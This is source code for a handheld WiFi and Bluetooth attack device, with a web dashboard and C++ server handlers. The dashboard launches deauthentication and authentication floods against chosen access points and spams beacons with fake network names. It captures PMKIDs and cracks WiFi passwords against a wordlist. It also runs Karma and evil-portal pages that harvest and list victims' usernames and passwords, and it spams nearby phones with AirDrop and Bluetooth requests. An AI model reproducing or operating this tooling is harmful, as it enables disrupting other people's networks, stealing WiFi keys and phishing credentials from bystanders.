let deauthRunning = false;
let deauthTargets = [];
async function deauthScan(){
  const el = document.getElementById('deauth-list');
  el.innerHTML = '<div style="color:var(--dim);padding:8px">Scanning...</div>';
  const r = await post('/cmd', {cmd:'deauth_scan', index:-1});
  await new Promise(res => setTimeout(res, 4000));
  const res = await fetch('/deauth_scan');
  if(!res.ok){ el.innerHTML='<div style="color:var(--red);padding:8px">Scan failed</div>'; return; }
  deauthTargets = await res.json();
  el.innerHTML = deauthTargets.map((t,i) => `
    <div style="display:flex;align-items:center;gap:8px;padding:5px 4px;border-bottom:1px solid var(--border);cursor:pointer" onclick="toggleDeauthTarget(${i})">
      <input type="checkbox" id="dt-${i}" style="accent-color:var(--red)">
      <div style="flex:1">
        <div style="color:var(--txt)">${t.ssid||'[Hidden]'}</div>
        <div style="color:var(--dim);font-size:.68rem">${t.bssid} &bull; ch${t.ch} &bull; ${t.rssi}dBm &bull; ${t.enc}</div>
      </div>
    </div>`).join('');
  document.getElementById('deauth-stats').textContent = deauthTargets.length + ' APs found -- select targets then launch';
}
function toggleDeauthTarget(i){
  const cb = document.getElementById('dt-'+i);
  if(cb) cb.checked = !cb.checked;
}
async function deauthAll(){
  await stopActiveAttack(); setActiveAttack('deauth_stop','Deauth Attack');
  await stopAllAttacks();
  await post('/cmd', {cmd:'deauth_all', index:-1});
  deauthRunning=true;
  document.getElementById('deauth-stats').textContent = 'Deauthing ALL targets...';
  pollDeauthStats();
  addLog('atk','Deauth All started');
}
async function deauthSelected(){
  const selected = deauthTargets.map((_,i) => {
    const cb = document.getElementById('dt-'+i);
    return cb && cb.checked ? i : -1;
  }).filter(i => i >= 0);
  if(!selected.length){ alert('Select at least one target'); return; }
  await post('/cmd', {cmd:'deauth_selected', index:-1, strVal: selected.join(',')});
  deauthRunning=true;
  document.getElementById('deauth-stats').textContent = 'Deauthing ' + selected.length + ' target(s)...';
  pollDeauthStats();
  addLog('atk','Deauth started on '+selected.length+' targets');
}
async function deauthStop(){
  clearActiveAttack();
  await post('/cmd', {cmd:'deauth_stop', index:-1});
  deauthRunning=false;
  addLog('atk','Deauth stopped');
}
function pollDeauthStats(){
  const iv = setInterval(async function(){
    if(!deauthRunning){ clearInterval(iv); return; }
    try{
      const r = await fetch('/deauth_state');
      if(!r.ok) return;
      const s = await r.json();
      document.getElementById('deauth-stats').textContent =
        'Running -- ' + s.count + ' deauth frames sent';
      if(!s.running){ deauthRunning=false; clearInterval(iv); }
    }catch(e){}
  }, 1000);
}

// -- Wardriving --
let wdRunning = false;
async function toggleStationScan(){
  const btn=document.getElementById('sta-btn');
  const running=btn.textContent.includes('Stop');
  await post('/cmd',{cmd:running?'station_scan_stop':'station_scan_start',index:-1});
  btn.textContent=running?'\u25b6 Start':'\u25a0 Stop';
  btn.style.borderColor=running?'var(--blue)':'var(--red)';
  btn.style.color=running?'var(--blue)':'var(--red)';
  document.getElementById('sta-status').textContent=running?'':'Scanning...';
  if(!running) setInterval(pollStations,2000);
}
async function pollStations(){
  try{
    const r=await fetch('/station_data'); if(!r.ok)return;
    const d=await r.json();
    document.getElementById('sta-status').textContent=d.count+' device(s) found';
    const el=document.getElementById('sta-list');
    if(!el||!d.stations||d.stations.length===0) return;
    el.innerHTML=d.stations.map(s=>`
      <div style="padding:4px 6px;border-bottom:1px solid var(--border);font-size:.7rem">
        <span style="color:var(--blue);font-family:monospace">${s.mac}</span>
        <span style="color:var(--dim)"> &rarr; </span>
        <span style="color:var(--txt)">${s.ssid||s.ap||"(probing)"}</span>
        <span style="color:var(--dim);font-size:.65rem"> ch${s.ch} ${s.rssi}dBm</span>
      </div>`).join('');
  }catch(e){}
}
async function toggleProbeScan(){
  const btn=document.getElementById('probe-btn');
  const running=btn.textContent.includes('Stop');
  await post('/cmd',{cmd:running?'probe_sniff_stop':'probe_sniff_start',index:-1});
  btn.textContent=running?'\u25b6 Start':'\u25a0 Stop';
  btn.style.borderColor=running?'var(--yellow)':'var(--red)';
  btn.style.color=running?'var(--yellow)':'var(--red)';
  document.getElementById('probe-status').textContent=running?'':'Listening...';
  if(!running) setInterval(pollProbes,2000);
}
async function pollProbes(){
  try{
    const r=await fetch('/probe_data'); if(!r.ok)return;
    const d=await r.json();
    document.getElementById('probe-status').textContent=d.count+' unique probe(s)';
    const el=document.getElementById('probe-list');
    if(!el||!d.probes||d.probes.length===0) return;
    el.innerHTML=d.probes.map(p=>`
      <div style="padding:4px 6px;border-bottom:1px solid var(--border)">
        <span style="color:var(--yellow);font-weight:600">${p.ssid}</span>
        <span style="color:var(--dim);font-size:.68rem"> ${p.mac} x${p.count} ${p.rssi}dBm</span>
      </div>`).join('');
  }catch(e){}
}
async function toggleWardrive(){
  wdRunning = !wdRunning;
  const btn = document.getElementById('wd-btn');
  await post('/cmd', {cmd: wdRunning ? 'wardrive_start' : 'wardrive_stop', index:-1});
  btn.textContent = wdRunning ? '&#9632; Stop' : '&#9654; Start';
  btn.style.borderColor = wdRunning ? 'var(--red)' : 'var(--accent)';
  btn.style.color = wdRunning ? 'var(--red)' : 'var(--accent)';
  if(wdRunning) pollWardrive();
  addLog('info','Wardriving ' + (wdRunning ? 'started' : 'stopped'));
}
async function clearWardrive(){
  if(!confirm('Clear all wardriving data?')) return;
  await post('/cmd', {cmd:'wardrive_clear', index:-1});
  document.getElementById('wd-list').innerHTML = '<div style="color:var(--dim);padding:8px">Cleared</div>';
  document.getElementById('wd-stats').textContent = 'Cleared';
}
function pollWardrive(){
  const iv = setInterval(async function(){
    try{
      const r = await fetch('/wardrive_data');
      if(!r.ok){ if(!wdRunning) clearInterval(iv); return; }
      const d = await r.json();
      document.getElementById('wd-stats').textContent =
        d.count + ' unique APs logged -- ' + d.total + ' total sightings';
      if(d.aps) updateWDChart(d.aps);
      const el = document.getElementById('wd-list');
      if(d.aps && d.aps.length){
        el.innerHTML = d.aps.map(a => `
          <div style="display:flex;gap:4px;padding:4px;border-bottom:1px solid var(--border);align-items:center">
            <span style="flex:2;color:${a.enc==='Open'?'var(--red)':'var(--txt)'}">${a.ssid}</span>
            <span style="flex:1.2;color:var(--dim);font-size:.65rem">${a.bssid}</span>
            <span style="flex:.4;color:var(--accent)">${a.ch}</span>
            <span style="flex:.6;color:${a.enc==='Open'?'var(--red)':'var(--green)'}">${a.enc}</span>
            <span style="flex:.5;color:${a.rssi>-60?'var(--green)':a.rssi>-75?'var(--yellow)':'var(--red)'}">${a.rssi}</span>
            <span style="flex:.4;color:var(--dim)">${a.seen}</span>
          </div>`).join('');
      }
      if(!wdRunning) clearInterval(iv);
    }catch(e){}
  }, 3000);
}
function updateWDChart(aps){
  const el = document.getElementById('wd-chart');
  if(!el || !aps || !aps.length) return;
  // Sort by RSSI descending, take top 20
  const sorted = [...aps].sort((a,b)=>b.rssi-a.rssi).slice(0,20);
  const maxRSSI = -30, minRSSI = -95;
  el.innerHTML = sorted.map(ap => {
    const pct = Math.max(5, Math.round((ap.rssi - minRSSI) / (maxRSSI - minRSSI) * 100));
    const col = pct > 60 ? 'var(--green)' : pct > 30 ? 'var(--yellow)' : 'var(--red)';
    const name = (ap.ssid||'?').substring(0,8);
    return `<div style="display:flex;flex-direction:column;align-items:center;flex:1;min-width:28px;max-width:52px">
      <div style="font-size:.6rem;color:var(--dim);margin-bottom:2px">${ap.rssi}</div>
      <div style="width:100%;background:${col};border-radius:3px 3px 0 0;height:${pct}px;min-height:4px;transition:height .4s"></div>
      <div style="font-size:.58rem;color:var(--txt);margin-top:3px;text-align:center;word-break:break-all;line-height:1.2">${name}</div>
    </div>`;
  }).join('');
}

async function exportWardrive(){
  const r = await fetch('/wardrive_data');
  if(!r.ok) return;
  const d = await r.json();
  if(!d.aps||!d.aps.length){ alert('No data to export'); return; }
  const csv = 'SSID,BSSID,Channel,Encryption,RSSI,Seen\n' +
    d.aps.map(a => `"${a.ssid}",${a.bssid},${a.ch},${a.enc},${a.rssi},${a.seen}`).join('\n');
  const blob = new Blob([csv], {type:'text/csv'});
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href=url; a.download='wardrive_'+Date.now()+'.csv'; a.click();
  addLog('info','Wardrive CSV exported');
}


// ── Troll Tools ─────────────────────────────────────────────────────────────
const APOC_SSIDS = [
  "404 WiFi Not Found","Loading...","Error: No Signal","WiFi Unavailable",
  "Please Wait...","Connecting...","Network Error","Access Denied",
  "Service Unavailable","Try Again","Connection Lost","No Internet",
  "System Failure","rebooting...","NULL","undefined","NaN",
  "\u00a0","\u200b","\u200c"
];
const TROLL_SSIDS = [
  "FBI Surveillance Van #3","Abraham Linksys","Pretty Fly for a WiFi",
  "Tell My WiFi Love Her","Not The NSA","Loading...","Virus.exe",
  "Series of Tubes","Wu-Tang LAN","LAN of the Free","Bill Wi the Science Fi",
  "Hide Yo Kids Hide Yo WiFi","The Internet","Skynet Global Defense",
  "Definitely Not Watching You","NSA Mobile Unit 4","CIA Station Alpha",
  "The Promised LAN","Martin Router King","John Wilkes Bluetooth"
];
const APOCALYPSE_SSIDS = [
  "404 WiFi Not Found","Error: No Signal","Loading... Please Wait",
  "Network Not Found","Rebooting System","Connection Failed",
  "Signal Lost","Disconnected","No Internet Access",
  "Critical Error","System Failure","WiFi.exe Has Stopped",
  "Please Restart Router","Authentication Failed","DNS Error",
  "Access Denied","Timeout Error","Packet Loss 100%",
  "Buffering...","Please Stand By"
];
async function trollSSIDs(){
  const ssids=TROLL_SSIDS.join(',');
  await post('/cmd',{cmd:'atk_beacon_list',index:60000,ssids:ssids});
  addLog('atk','Troll SSIDs started -- '+TROLL_SSIDS.length+' SSIDs');
  alert('Flooding with '+TROLL_SSIDS.length+' classic troll SSIDs!');
}
// Troll tool state
let _fbiRunning = false;
let _apocRunning = false;

async function toggleFBIVan(){
  if(_fbiRunning){
    await post('/cmd',{cmd:'stop_all_attacks',index:-1,strVal:''});
    _fbiRunning=false;
    const _fbi_btn=document.getElementById('troll-fbi-btn');
    if(_fbi_btn){_fbi_btn.textContent='\u{1F602} FBI Van Classics';_fbi_btn.style.borderColor='var(--purple)';_fbi_btn.style.color='var(--purple)';}
    addLog('info','FBI Van stopped');
    setTimeout(()=>fetch('/full_state').then(r=>r.json()).then(d=>updateState(d)).catch(()=>{}),400);
    return;
  }
  // Stop everything first, wait for firmware to process it, then start
  await post('/cmd',{cmd:'stop_all_attacks',index:-1,strVal:''});
  await new Promise(r=>setTimeout(r,400));
  const ssids=TROLL_SSIDS.join(',');
  await post('/cmd',{cmd:'atk_beacon_list',index:-1,ssids:ssids});
  _fbiRunning=true;
  const _fbi_btn2=document.getElementById('troll-fbi-btn');
  if(_fbi_btn2){_fbi_btn2.textContent='\u{1F602} FBI Van (running)';_fbi_btn2.style.borderColor='var(--green)';_fbi_btn2.style.color='var(--green)';}
  addLog('atk','FBI Van Classics started');
}

async function toggleApocalypse(){
  if(_apocRunning){
    await post('/cmd',{cmd:'stop_all_attacks',index:-1,strVal:''});
    _apocRunning=false;
    const _apoc_btn=document.getElementById('troll-apoc-btn');
    if(_apoc_btn){_apoc_btn.textContent='\u{1F4A5} Network Apocalypse';_apoc_btn.style.borderColor='var(--red)';_apoc_btn.style.color='var(--red)';}
    addLog('info','Apocalypse stopped');
    setTimeout(()=>fetch('/full_state').then(r=>r.json()).then(d=>updateState(d)).catch(()=>{}),400);
    return;
  }
  // Stop everything first, wait for firmware to process it, then start
  await post('/cmd',{cmd:'stop_all_attacks',index:-1,strVal:''});
  await new Promise(r=>setTimeout(r,400));
  const ssids=APOC_SSIDS.join(',');
  await post('/cmd',{cmd:'atk_beacon_list',index:-1,ssids:ssids});
  _apocRunning=true;
  const _apoc_btn2=document.getElementById('troll-apoc-btn');
  if(_apoc_btn2){_apoc_btn2.textContent='\u{1F4A5} Apocalypse (running)';_apoc_btn2.style.borderColor='var(--green)';_apoc_btn2.style.color='var(--green)';}
  addLog('atk','Network Apocalypse started');
}

async function stopTrollTools(){
  await post('/cmd',{cmd:'atk_beacon_stop',index:-1,strVal:''});
  _fbiRunning=false; _apocRunning=false;
  const _st1=document.getElementById('troll-fbi-btn');
  const _st2=document.getElementById('troll-apoc-btn');
  if(_st1){_st1.textContent='\u{1F602} FBI Van Classics';_st1.style.borderColor='var(--purple)';_st1.style.color='var(--purple)';}
  if(_st2){_st2.textContent='\u{1F4A5} Network Apocalypse';_st2.style.borderColor='var(--red)';_st2.style.color='var(--red)';}
  addLog('info','Troll tools stopped');
  setTimeout(()=>fetch('/full_state').then(r=>r.json()).then(d=>updateState(d)).catch(()=>{}),400);
}

async function networkApocalypse(){
  const ssids=APOCALYPSE_SSIDS.join(',');
  await post('/cmd',{cmd:'atk_beacon_list',index:60000,ssids:ssids});
  addLog('atk','Network Apocalypse started');
  alert('Network Apocalypse launched! Local WiFi lists now look completely broken.');
}

// ── Auth Flood ───────────────────────────────────────────────────────────────
let authTargets=[];
async function authFloodScan(){
  const el=document.getElementById('auth-list');
  el.innerHTML='<div style="color:var(--dim);padding:8px">Scanning...</div>';
  await post('/cmd',{cmd:'auth_flood_scan',index:-1});
  await new Promise(r=>setTimeout(r,4000));
  const res=await fetch('/auth_flood_scan');
  if(!res.ok){el.innerHTML='<div style="color:var(--red)">Failed</div>';return;}
  authTargets=await res.json();
  el.innerHTML=authTargets.map((t,i)=>`
    <div style="display:flex;align-items:center;gap:8px;padding:5px 4px;border-bottom:1px solid var(--border)">
      <input type="checkbox" id="at-${i}" style="accent-color:var(--red)">
      <div><span style="color:var(--txt)">${t.ssid||'[Hidden]'}</span>
      <span style="color:var(--dim);font-size:.68rem"> ${t.bssid} ch${t.ch} ${t.rssi}dBm</span></div>
    </div>`).join('');
  document.getElementById('auth-stats').textContent=authTargets.length+' APs found';
}
async function authFloodAll(){
  await stopActiveAttack(); setActiveAttack('auth_flood_stop','Auth Flood');
  await stopAllAttacks();
  await post('/cmd',{cmd:'auth_flood_all',index:-1});
  document.getElementById('auth-stats').textContent='Flooding ALL targets with fake auth frames...';
  addLog('atk','Auth flood all started');
}
async function authFloodSelected(){
  const sel=authTargets.map((_,i)=>{const c=document.getElementById('at-'+i);return c&&c.checked?i:-1;}).filter(i=>i>=0);
  if(!sel.length){alert('Select at least one target');return;}
  await post('/cmd',{cmd:'auth_flood_sel',index:-1,strVal:sel.join(',')});
  document.getElementById('auth-stats').textContent='Flooding '+sel.length+' targets...';
  addLog('atk','Auth flood on '+sel.length+' targets');
}
async function authFloodStop(){
  clearActiveAttack();
  await post('/cmd',{cmd:'auth_flood_stop',index:-1});
  document.getElementById('auth-stats').textContent='Stopped';
  addLog('atk','Auth flood stopped');
}

// ── PMKID Capture ────────────────────────────────────────────────────────────
let pmkidRunning=false;
async function togglePMKID(){
  pmkidRunning=!pmkidRunning;
  const btn=document.getElementById('pmkid-btn');
  await post('/cmd',{cmd:pmkidRunning?'pmkid_start':'pmkid_stop',index:-1});
  btn.textContent=pmkidRunning?'&#9632; Stop':'&#9654; Start';
  btn.style.borderColor=pmkidRunning?'var(--red)':'var(--accent)';
  btn.style.color=pmkidRunning?'var(--red)':'var(--accent)';
  if(pmkidRunning) pollPMKID();
  addLog('atk','PMKID capture '+(pmkidRunning?'started':'stopped'));
}
function pollPMKID(){
  const iv=setInterval(async function(){
    try{
      const r=await fetch('/pmkid_data');if(!r.ok)return;
      const d=await r.json();
      const stats=document.getElementById('pmkid-stats');
      const list=document.getElementById('pmkid-list');
      const dl=document.getElementById('pmkid-dl');
      if(stats)stats.textContent=d.count+' PMKIDs captured -- listening on all channels';
      if(d.count>0&&dl)dl.style.display='inline-flex';
      if(d.caps) updateCrackSelect(d.caps);
      if(list&&d.caps)list.innerHTML=d.caps.map(p=>`
        <div style="padding:4px;border-bottom:1px solid var(--border)">
          <span style="color:var(--yellow)">${p.bssid}</span>
          <span style="color:var(--dim);font-size:.65rem"> ch${p.ch}</span><br>
          <span style="color:var(--green);font-size:.7rem;font-family:monospace">${p.pmkid}</span>
        </div>`).join('');
      if(!pmkidRunning)clearInterval(iv);
    }catch(e){}
  },2000);
}
// ── WiFi Password Cracker ────────────────────────────────────────────────
let _crackPoller = null;
let _pmkidCaptures = []; // populated from pollPMKID

function updateCrackSelect(caps){
  _pmkidCaptures = caps || [];
  const sel = document.getElementById('crack-target');
  if(!sel) return;
  sel.innerHTML = '<option value="">-- Select captured PMKID --</option>' +
    caps.map((p,i)=>`<option value="${i}">${p.bssid} (ch${p.ch})</option>`).join('');
}

async function startCrack(){
  const sel = document.getElementById('crack-target');
  if(!sel||sel.value===''){alert('Capture a PMKID first, then select it');return;}
  const p = _pmkidCaptures[parseInt(sel.value)];
  if(!p){alert('No capture data');return;}
  const strVal = `${p.ssid||'unknown'}|${p.bssid.replace(/:/g,'')}|${p.client||'000000000000'}|${p.pmkid}`;
  await post('/cmd',{cmd:'wifi_crack_start',index:-1,strVal});
  document.getElementById('crack-bar-wrap').style.display='block';
  document.getElementById('crack-result').style.display='none';
  document.getElementById('crack-fail').style.display='none';
  document.getElementById('crack-btn').style.color='var(--dim)';
  if(_crackPoller) clearInterval(_crackPoller);
  _crackPoller = setInterval(pollCrack, 800);
  addLog('atk','WiFi crack started: '+p.bssid);
}
async function stopCrack(){
  await post('/cmd',{cmd:'wifi_crack_stop',index:-1});
  if(_crackPoller){clearInterval(_crackPoller);_crackPoller=null;}
  document.getElementById('crack-btn').style.color='var(--yellow)';
}
async function pollCrack(){
  const r = await get('/crack_state');
  if(!r) return;
  const bar    = document.getElementById('crack-bar');
  const status = document.getElementById('crack-status');
  if(bar && r.total>0) bar.style.width = Math.round(r.tried/r.total*100)+'%';
  if(status) status.textContent = r.running
    ? `[${r.tried}/${r.total}] Trying: ${r.current}...`
    : r.done ? (r.found ? '✓ Found!' : 'Complete — not in wordlist') : '';
  if(r.done){
    clearInterval(_crackPoller); _crackPoller=null;
    document.getElementById('crack-btn').style.color='var(--yellow)';
    if(r.found){
      document.getElementById('crack-result').style.display='block';
      document.getElementById('crack-found-pass').textContent = r.password;
      addLog('cred','PASSWORD CRACKED: '+r.ssid+' = '+r.password);
    } else {
      document.getElementById('crack-fail').style.display='block';
    }
  }
}
// ─────────────────────────────────────────────────────────────────────────

async function downloadPMKID(){
  const r=await fetch('/pmkid_export');
  if(!r.ok){alert('No captures yet');return;}
  const txt=await r.text();
  const blob=new Blob([txt],{type:'text/plain'});
  const url=URL.createObjectURL(blob);
  const a=document.createElement('a');
  a.href=url;a.download='capture.hc22000';a.click();
  addLog('info','PMKID hashcat file downloaded');
}

// ── BT Extra Attacks ─────────────────────────────────────────────────────────
let airdropRunning=false;
async function toggleAirdrop(){
  airdropRunning=!airdropRunning;
  const btn=document.getElementById('airdrop-btn');
  const sta=document.getElementById('airdrop-status');
  if(airdropRunning) await stopAllAttacks();
  await post('/cmd',{cmd:airdropRunning?'airdrop_start':'airdrop_stop',index:-1});
  btn.textContent=airdropRunning?'&#9632; Stop':'&#9654; Start';
  btn.style.color=airdropRunning?'var(--red)':'var(--accent)';
  sta.textContent=airdropRunning?'Flooding nearby iPhones with AirDrop requests...':'Stopped';
  addLog('atk','AirDrop spam '+(airdropRunning?'started':'stopped'));
}
async function spamController(type){
  await stopAllAttacks();
  const names=['Joy-Con (L)','PS5 DualSense','Xbox Controller'];
  await post('/cmd',{cmd:'controller_spam',index:type});
  document.getElementById('controller-status').textContent='Spamming as '+names[type]+'...';
  addLog('atk','Controller spam: '+names[type]);
}
async function stopController(){
  await post('/cmd',{cmd:'controller_stop',index:-1});
  document.getElementById('controller-status').textContent='Stopped';
}
async function scanTrackers(){
  const el=document.getElementById('tracker-list');
  const sta=document.getElementById('tracker-stats');
  el.innerHTML='<div style="color:var(--dim);padding:8px">Scanning 5 seconds...</div>';
  await post('/cmd',{cmd:'scan_trackers',index:-1});
  await new Promise(r=>setTimeout(r,6000));
  const res=await fetch('/tracker_data');
  if(!res.ok){el.innerHTML='<div style="color:var(--red)">Failed</div>';return;}
  const d=await res.json();
  sta.textContent=d.count+' tracker(s) found';
  if(!d.trackers||!d.trackers.length){
    el.innerHTML='<div style="color:var(--green);padding:8px">&#10003; No trackers detected</div>';return;
  }
  el.innerHTML=d.trackers.map(t=>`
    <div style="padding:6px 4px;border-bottom:1px solid var(--border)">
      <span style="color:var(--red);font-weight:700">${t.type}</span>
      <span style="color:var(--dim);font-size:.7rem"> ${t.rssi}dBm</span><br>
      <span style="color:var(--dim);font-size:.72rem">${t.address}</span>
    </div>`).join('');
  addLog('info','Tracker scan: '+d.count+' found');
}
async function startNameSpoof(){
  const name=document.getElementById('spoof-name').value||'AirPods Pro';
  const type=parseInt(document.getElementById('spoof-type').value);
  await post('/cmd',{cmd:'name_spoof_start',index:type,strVal:name});
  document.getElementById('spoof-status').textContent='Advertising as "'+name+'"';
  addLog('atk','BLE name spoof: '+name);
}
async function stopNameSpoof(){
  await post('/cmd',{cmd:'name_spoof_stop',index:-1});
  document.getElementById('spoof-status').textContent='Stopped';
}

</script>
</body>
</html>

)~";


// ==================================================================

bool WebUI::begin() {
  WiFi.mode(WIFI_AP_STA);  // AP_STA needed for raw frame injection
  WiFi.softAP(AP_SSID, AP_PASS);
  delay(200);
  Serial.println("=========================");
  Serial.println("Hotspot: " + String(AP_SSID));
  Serial.println("Pass:    " + String(AP_PASS));
  Serial.println("URL:     http://" + WiFi.softAPIP().toString());
  Serial.println("=========================");
  if(_routesRegistered){ server.begin(); return true; } // restart only, no re-registration
  _routesRegistered = true;
  server.on("/",      [this](){ handleRoot();     });
  server.on("/dash",  [this](){
    // Always serves the main dashboard regardless of portal mode
    bool saved=_portalActive;
    _portalActive=false;
    handleRoot();
    _portalActive=saved;
  });
  server.on("/state", [this](){ handleGetState(); });
  server.on("/cmd",         HTTP_POST, [this](){ handleCommand();  });
  server.on("/karma_creds",  [this](){ handleKarmaCreds(); });
  server.on("/karma_conns",  [this](){ handleKarmaConns(); });
  server.on("/karma_state",  [this](){ handleKarmaState();  });
  server.on("/karma_scan",   [this](){ handleKarmaScan();   });
  server.on("/karma_select", HTTP_POST, [this](){ handleKarmaSelect(); });
  server.on("/eapol_caps",   [this](){ handleEapolCaps();    });
  server.on("/full_state",   [this](){ handleFullState();   });
  server.on("/stored_creds",  [this](){ handleStoredCreds(); });
  server.on("/badble_state",   [this](){ handleBadBLEState();   });
  server.on("/deauth_scan",    [this](){ handleDeauthScan();   });
  server.on("/deauth_state",   [this](){ handleDeauthState();  });
  server.on("/station_data",   [this](){ handleStationData();  });
  server.on("/probe_data",     [this](){ handleProbeData();    });
  server.on("/wardrive_data",  [this](){ handleWardriveData(); });
  server.on("/ep_creds",       [this](){ handleEPCreds();      });
  server.on("/karma-portal",   [this](){ handleKarmaPortal();  });
  server.on("/crack_state",    [this](){ handleCrackState();   });
  server.on("/karma-login", HTTP_POST, [this](){ handleKarmaLogin();   });
  server.on("/auth_flood_scan",[this](){ handleAuthFloodScan(); });
  server.on("/pmkid_data",     [this](){ handlePMKIDData();     });
  server.on("/pmkid_export",   [this](){ handlePMKIDExport();   });
  server.on("/tracker_data",   [this](){ handleTrackerData();   });
  server.on("/ota_state",    [this](){ handleOTAState();    });
  server.on("/pine_results", [this](){ handlePineResults();  });
  server.on("/cc_devices",   [this](){ handleCCDevices();    });
  server.on("/apc_scan",     [this](){ handleAPCScan();    });
  server.on("/apc_select",   HTTP_POST, [this](){ handleAPCSelect(); });
  server.begin();
  return true;
}

void WebUI::handleKarmaScan() {
  extern KarmaAttack karmaAttack;
  String json = "[";
  for(int i=0;i<karmaAttack.getScanCount();i++){
    KarmaTarget& t = karmaAttack.getTarget(i);
    if(i>0) json+=",";
    json+="{";
    json+="\"idx\":"  + String(i) + ",";
    json+="\"ssid\":\"" + String(t.ssid) + "\",";
    json+="\"sel\":" + String(t.selected?"true":"false");
    json+="}";
  }
  json+="]";
  server.sendHeader("Access-Control-Allow-Origin","*");
  server.send(200,"application/json",json);
}

void WebUI::handleKarmaSelect() {
  extern KarmaAttack karmaAttack;
  if(server.hasArg("plain")){
    DynamicJsonDocument doc(512);
    deserializeJson(doc, server.arg("plain"));
    if(doc.containsKey("all")){
      bool all=doc["all"];
      if(all) karmaAttack.selectAll(); else karmaAttack.clearSelection();
    } else if(doc.containsKey("idx")){
      int idx=doc["idx"]; bool on=doc["on"]|true;
      karmaAttack.select(idx,on);
    }
  }
  server.send(200,"application/json","{\"ok\":true}");
}

void WebUI::handleKarmaState() {
  extern KarmaAttack karmaAttack;
  bool r = karmaAttack.isRunning();
  server.sendHeader("Access-Control-Allow-Origin","*");
  server.send(200,"application/json", r ? "{\"running\":true}" : "{\"running\":false}");
}

void WebUI::handleKarmaCreds() {
  extern KarmaAttack karmaAttack;
  String json = "[";
  for(int i=0;i<karmaAttack.getCredCount();i++){
    KarmaCred c = karmaAttack.getCred(i);
    if(i>0) json+=",";
    json+="{";
    json+="\"ssid\":\""  +c.ssid+"\"," ;
    json+="\"user\":\""  +c.user+"\"," ;
    json+="\"pass\":\""  +c.pass+"\"," ;
    json+="\"ip\":\""    +c.ip  +"\"," ;
    json+="\"mac\":\""   +c.mac +"\""  ;
    json+="}";
  }
  json+="]";
  server.sendHeader("Access-Control-Allow-Origin","*");
  server.send(200,"application/json",json);
}

void WebUI::handleKarmaConns() {
  extern KarmaAttack karmaAttack;
  String json = "[";
  for(int i=0;i<karmaAttack.getConnCount();i++){
    KarmaConn cn = karmaAttack.getConn(i);
    if(i>0) json+=",";
    json+="{";
    json+="\"ip\":\"" +cn.ip        +"\"," ;
    json+="\"mac\":\""+cn.mac       +"\"," ;
    json+="\"ua\":\"" +cn.useragent.substring(0,80)+"\"," ;
    json+="\"ssid\":\""+cn.ssid     +"\""  ;
    json+="}";
  }
  json+="]";
  server.sendHeader("Access-Control-Allow-Origin","*");
  server.send(200,"application/json",json);
}

void WebUI::handlePineResults() {
  server.sendHeader("Access-Control-Allow-Origin","*");
  server.send(200,"application/json",pinePayload);
}

void WebUI::handleCCDevices() {
  server.sendHeader("Access-Control-Allow-Origin","*");
  server.send(200,"application/json",ccPayload);
}

void WebUI::handleDeauthScan() {
  server.sendHeader("Access-Control-Allow-Origin","*");
  server.send(200,"application/json",deauthScanPayload);
}

void WebUI::handleDeauthState() {
  server.sendHeader("Access-Control-Allow-Origin","*");
  server.send(200,"application/json",deauthStatePayload);
}

void WebUI::handleCrackState() {
  extern WiFiCracker wifiCracker;
  CrackResult& r = wifiCracker.getResult();
  String json = "{";
  json += "\"running\":" + String(r.running?"true":"false") + ",";
  json += "\"done\":"    + String(r.done?"true":"false")    + ",";
  json += "\"found\":"   + String(r.found?"true":"false")   + ",";
  json += "\"tried\":"   + String(r.tried)                  + ",";
  json += "\"total\":"   + String(r.total)                  + ",";
  json += "\"current\":\"" + r.current   + "\",";
  json += "\"password\":\"" + r.password + "\",";
  json += "\"ssid\":\""    + r.ssid      + "\"";
  json += "}";
  server.sendHeader("Access-Control-Allow-Origin","*");
  server.send(200,"application/json",json);
}
void WebUI::handleKarmaPortal() {
  String html = karmaAttack.getPortalHtml();
  html.replace("action=\"/login\"", "action=\"/karma-login\"");
  server.sendHeader("Access-Control-Allow-Origin","*");
  server.send(200,"text/html",html);
}
void WebUI::handleKarmaLogin() {
  String user = server.hasArg("user") ? server.arg("user") : "";
  String pass = server.hasArg("pass") ? server.arg("pass") : "";
  String ip   = server.client().remoteIP().toString();
  if(user.length() || pass.length()) {
    cyberStorage.saveCred("karma", "Preview", user, pass, ip);
    Serial.printf("Karma test cred: %s / %s\n", user.c_str(), pass.c_str());
  }
  server.sendHeader("Location","/?karma_success=1",true);
  server.send(302,"text/plain","");
}

void WebUI::handleEPCreds() {
  String json = "[";
  for(int i=0;i<evilPortal.getCredCount();i++){
    EPCred cr = evilPortal.getCred(i);
    if(i>0) json+=",";
    json+="{";
    json+="\"user\":\"" + cr.user + "\",";
    json+="\"pass\":\"" + cr.pass + "\",";
    json+="\"ip\":\""   + cr.ip   + "\"";
    json+="}";
  }
  json+="]";
  server.sendHeader("Access-Control-Allow-Origin","*");
  server.send(200,"application/json",json);
}

void WebUI::handleStationData() {
  extern StationScanner stationScanner;
  String json = "{";
  json += "\"running\":" + String(stationScanner.isRunning()?"true":"false");
  json += ",\"count\":" + String(stationScanner.getCount()) + ",\"stations\":[";
  for(int i=0;i<stationScanner.getCount();i++){
    Station s = stationScanner.getStation(i);
    if(i>0) json+=",";
    json+="{";
    json+="\"mac\":\"" + s.mac + "\",";
    json+="\"ap\":\"" + s.apBssid + "\",";
    json+="\"ssid\":\"" + s.apSSID + "\",";
    json+="\"rssi\":" + String(s.rssi) + ",";
    json+="\"ch\":" + String(s.channel) + ",";
    json+="\"probe\":" + String(s.isProbing?"true":"false");
    json+="}";
  }
  json+="]}";
  server.sendHeader("Access-Control-Allow-Origin","*");
  server.send(200,"application/json",json);
}
void WebUI::handleProbeData() {
  extern ProbeSniffer probeSniffer;
  String json = "{";
  json += "\"running\":" + String(probeSniffer.isRunning()?"true":"false");
  json += ",\"count\":" + String(probeSniffer.getCount()) + ",\"probes\":[";
  for(int i=0;i<probeSniffer.getCount();i++){
    ProbeResult r = probeSniffer.getResult(i);
    if(i>0) json+=",";
    json+="{";
    json+="\"mac\":\"" + r.clientMAC + "\",";
    json+="\"ssid\":\"" + r.ssid + "\",";
    json+="\"rssi\":" + String(r.rssi) + ",";
    json+="\"count\":" + String(r.count);
    json+="}";
  }
  json+="]}";
  server.sendHeader("Access-Control-Allow-Origin","*");
  server.send(200,"application/json",json);
}
void WebUI::handleWardriveData() {
  server.sendHeader("Access-Control-Allow-Origin","*");
  server.send(200,"application/json",wardrivePayload);
}

void WebUI::handleAuthFloodScan() {
  server.sendHeader("Access-Control-Allow-Origin","*");
  server.send(200,"application/json",authFloodPayload);
}
